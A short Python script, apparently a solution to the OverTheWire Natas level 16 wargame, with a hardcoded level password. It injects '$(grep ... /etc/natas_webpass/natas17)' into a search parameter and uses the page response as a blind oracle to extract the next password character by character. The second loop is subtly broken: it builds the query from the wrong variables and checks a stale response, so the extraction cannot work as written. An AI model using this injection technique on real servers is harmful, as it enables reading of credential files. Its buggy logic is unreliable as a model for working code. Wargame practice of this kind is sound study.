#!/bin/python
import requests,string
from string import *

username = "natas16"
pwd = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

chars= ascii_lowercase+ascii_uppercase+digits
fchars = ' '
pwd17 = ' '
for ch in chars:
	r = requests.get(f'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep {ch} /etc/natas_webpass/natas17)', auth = (username,pwd))
	content=r.text
	if 'doomed' not in content:
		fchars=fchars+ch
		print(fchars)

for i in range(32):
	for ch in fchars:
		response = requests.get(f"http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^{pwd+fchars} /etc/natas_webpass/natas17)",auth=(username,pwd))
		if 'doomed' not in content:
			pwd17 = pwd17+ch
			print(pwd17)
			break
print('\t\tTHE PASSWORD IS : \n\t',pwd17)
